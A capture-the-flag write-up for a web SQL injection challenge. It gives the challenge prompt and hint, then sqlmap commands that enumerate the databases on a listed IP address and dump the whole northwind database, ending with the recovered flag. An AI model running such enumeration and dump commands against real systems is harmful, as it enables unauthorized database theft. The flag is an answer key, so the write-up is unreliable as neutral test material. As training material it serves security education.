# Web

## SQL Injection V2

Please open [this site](http://178.128.112.149/10_medium)

You are given access to a system that is vulnerable to SQL Injection attacks. Your task is to get a list of all usernames stored in the database. How can you do this?

Hint: Utilizing the UNION operator in SQL, you can combine the results of the original query with a new SELECT statement that retrieves usernames from the users table. Can you create a payload and include it in the id parameter to exploit this vulnerability?

---

### Solution

```bash
$ sqlmap -u "http://178.128.112.149/10_medium/?kata_cari=1" --dbms="MySQL" --dbs

available databases [5]:
[*] information_schema
[*] mysql
[*] northwind
[*] performance_schema
[*] sys
```

```bash
$ sqlmap -u "http://178.128.112.149/10_medium/?kata_cari=1" --dbms="MySQL" -D northwind --dump-all --batch

Database: northwind
Table: customers
[91 entries]
```

| 69 | Madrid | Gran Vía, 1 | Spain | 28001 | Alejandra Camino |  BPJS{79393cd51833d7facbc6fc29ef9fce9a} |


>BPJS{79393cd51833d7facbc6fc29ef9fce9a}